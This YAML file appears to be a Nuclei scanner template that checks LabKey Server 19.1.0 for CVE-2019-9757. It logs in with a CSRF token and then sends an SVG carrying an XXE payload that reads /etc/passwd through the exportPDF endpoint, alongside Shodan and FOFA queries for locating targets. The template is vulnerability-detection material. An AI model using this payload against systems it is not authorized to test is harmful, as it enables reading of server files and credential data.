flow: http(1) && http(2) && http(3)
http:
- extractors:
  - group: 1
    internal: true
    name: csrf
    regex:
    - '"X\-LABKEY\-CSRF":"([0-9a-z]+)"'
    type: regex
  raw:
  - 'GET /labkey/home/project-begin.view HTTP/1.1

    Host: {{Hostname}}

    '
- host-redirects: true
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - '!status_code == 400'
    type: dsl
  raw:
  - 'POST /home/login-loginApi.api HTTP/1.1

    Host: {{Hostname}}

    X-LABKEY-CSRF: {{csrf}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8


    remember=on&email={{username}}&password={{password}}&approvedTermsOfUse=false

    '
- matchers:
  - condition: and
    dsl:
    - regex("root:.*:0:0:", body)
    - status_code == 200
    type: dsl
  raw:
  - 'POST /labkey/home/visualization-exportPDF.view HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=---------------------------735323031399963166993862150


    -----------------------------735323031399963166993862150

    Content-Disposition: form-data; name="X-LABKEY-CSRF"


    {{csrf}}

    -----------------------------735323031399963166993862150

    Content-Disposition: form-data; name="svg"


    <?xml version="1.0" standalone="yes"?>

    <!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>

    <svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg">

    <text x="0" y="15" fill="red">&xxe;</text>

    </svg>

    -----------------------------735323031399963166993862150

    Content-Disposition: form-data; name="title"


    test

    -----------------------------735323031399963166993862150--

    '
id: CVE-2019-9757
info:
  author: ritikchaddha
  classification:
    cpe: cpe:2.3:a:labkey:labkey_server:19.1.0:*:*:*:*:*:*:*
    cve-id: CVE-2019-9757
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-611
    epss-percentile: 0.99351
    epss-score: 0.8592
  description: 'An issue was discovered in LabKey Server 19.1.0. Sending an SVG containing
    an XXE payload to the endpoint visualization-exportImage.view or visualization-exportPDF.view
    allows local files to be read.

    '
  impact: 'Attackers can read arbitrary local files on the server, potentially leading
    to information disclosure.

    '
  metadata:
    fofa-query: title="LabKey"
    max-request: 3
    product: labkey_server
    shodan-query: title:"LabKey"
    vendor: labkey
  name: LabKey Server 19.1.0 - XML External Entity (XXE)
  reference:
  - https://rhinosecuritylabs.com/application-security/labkey-server-vulnerabilities-to-rce/
  - https://github.com/LabKey/Issues/issues/37636
  - https://nvd.nist.gov/vuln/detail/CVE-2019-9757
  remediation: 'Update to the latest version of LabKey Server or apply security patches
    that fix XML parsing vulnerabilities.

    '
  severity: high
  tags: cve,cve2019,labkey,xxe,authenticated,vuln
